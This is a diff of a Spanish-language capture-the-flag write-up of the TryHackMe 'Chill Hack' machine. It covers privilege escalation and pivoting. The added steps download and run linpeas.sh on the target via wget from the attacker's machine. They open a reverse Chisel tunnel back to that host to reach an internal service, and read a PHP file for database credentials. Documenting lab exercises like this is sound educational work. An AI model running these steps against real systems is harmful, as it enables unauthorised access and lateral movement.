@@ -2,7 +2,7 @@
 title: Write-Up Chill Hack
 description: Write-Up sobre la máquina Chill Hack de TryHackMe
 published: false
-date: 2025-01-24T14:41:46.406Z
+date: 2025-01-24T15:02:17.198Z
 tags: tryhackme
 editor: markdown
 dateCreated: 2025-01-24T11:20:08.121Z
@@ -139,6 +139,8 @@ Como podemos ver en la terminal, nos devuelve apaar, por lo que podriamos intent
 
 ### Apaar
 Ya somos apaar, haremos lo mismo. Comprobaremos tanto *id* como *sudo -l*, lamentablemente no tenemos nada interante para continuar.
+![imagen_hacking_chill-hack_31permisosapaar.png](/imagen_hacking_chill-hack_31permisosapaar.png)
+
 Podemos comprobar si vemos algo en el home del usuario para ello hacemos
 ```bash
 cd 
@@ -151,6 +153,8 @@ Podemos encontrar un txt llamado local, el cual si lo leemos con un cat, podremo
 > En este punto yo estaba en punto muerto, por lo que se ha intentado continuar siguiendo algunos write-up y se recomienda el uso de Linpeas
 {.is-danger}
 
+> Linpeas es un software de escaneo de vulnerabilidades y no se recomiendo bajo ninguna circunstancia el uso de esta herramienta para otra cosa que no sea hackeo ético y con el previo permiso del dueño del equipo.
+
 Debido a que no tenemos forma ninguna de continuar, vamos a intentar usar una herramienta llamada Linpeas, que nos permitirá encontrar vulnerabilidades en el sistema.
 Nos descargamos linepas del github oficial: [Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master). Nos vamos a descargar el [Linpeas.sh]()
 
@@ -162,3 +166,69 @@ python -m http.server 8000
 {.is-warning}
 
 ![imagen_hacking_chill-hack_21pasarlinpeas.png](/imagen_hacking_chill-hack_21pasarlinpeas.png)
+
+En nuestra shell, vamos a escribir lo siguiente:
+```sh
+wget http://10.9.3.9:8000/linpeas.sh
+```
+![imagen_hacking_chill-hack_22obtenerlinpeas.png](/imagen_hacking_chill-hack_22obtenerlinpeas.png)
+Una vez lo descargamos, le damos permisos de ejecución y lo ejecutamos
+```bash
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+Si dejamos que Linpeas analicé todo, vamos a encontrar que hay un puerto activo en 127.0.0.1:9001, es decir solo puede entrar por si mismo, también del puerto 3306 que es MySQL
+![imagen_hacking_chill-hack_24informacion_limpeas.png](/imagen_hacking_chill-hack_24informacion_limpeas.png)
+
+Vamos a intentar acceder a el, para ello usaremos la herramienta Chisel
+> Ir a la práctica de pivotaje para descargar Chisel y la configuración de los proychains5 [enlace](https://ciberapuntes.com/es/apuntes/ciber/Hacking_Etico/Pivotaje)
+{.is-info}
+
+Una vez descargado, vamos a hacer el mismo proceso que hicimos para pasar linpeas, por lo que abrimos de nuevo el servicio web
+```python
+python -m http.server 8000
+```
+> Si diera error el puerto 8000, cambiar de puerto, o asegurarse que están todos los procesos termiando con dicho puerto.
+{.is-warning}
+
+Tras haberlo descargado e dado los permisos de ejecución, vamos a ejecutarlo.
+En nuestra máquina Kali, vamos a poner el siguiente comando
+```bash
+./chisel server -p 4000 --reverse --socks5
+```
+![imagen_hacking_chill-hack_27chisel_kali.png](/imagen_hacking_chill-hack_27chisel_kali.png)
+Y en la máquina de TryHackMe, vamos a poner lo siguiente:
+```bash
+./chisel client 10.9.3.9:4000 R:9001:127.0.0.1:9001
+```
+![imagen_hacking_chill-hack_28chisel_thm.png](/imagen_hacking_chill-hack_28chisel_thm.png)
+
+Teniendo el proxy activado, si acudimos a nuestro navegador y ponemos *127.0.0.1:9001*, podemos ver lo siguiente:
+![imagen_hacking_chill-hack_29websitelocalhost.png](/imagen_hacking_chill-hack_29websitelocalhost.png)
+
+No tenemos ningúna de las credenciales, por lo que deberemos volver atrás. Esto nos hace preguntar, ¿Dondé están los archivos de este servicio web?.
+
+Recordamos que los archivos del primer servicio web estába en /var/www/html, sin embargo, normalmente solo hace falta que esté en /var/www, para que se pueda ver. Por lo que hay algo raro.
+Si hacemos un ls a la carpeta /var/www, podemos ver lo siguiente
+```bash
+ls /var/www
+```
+
+![imagen_hacking_chill-hack_30websites.png](/imagen_hacking_chill-hack_30websites.png)
+
+Tenemos una carpeta llamada files, si hacemos un ls a está carpeta podemos encontrar más cosas interesantes.
+```bash
+cd /var/www/files
+ls
+```
+![imagen_hacking_chill-hack_32lsfiles.png](/imagen_hacking_chill-hack_32lsfiles.png)
+
+Tenemos el index, en formato php, es posible que tenga almacenada las credenciales de acceso.
+
+Hacemos por lo tanto un:
+```bash
+cat index.php
+```
+![imagen_hacking_chill-hack_33indexfiles.png](/imagen_hacking_chill-hack_33indexfiles.png)
+Como observamos en la imagen, tenemos una conexión con una base de datos llamada **webportal**
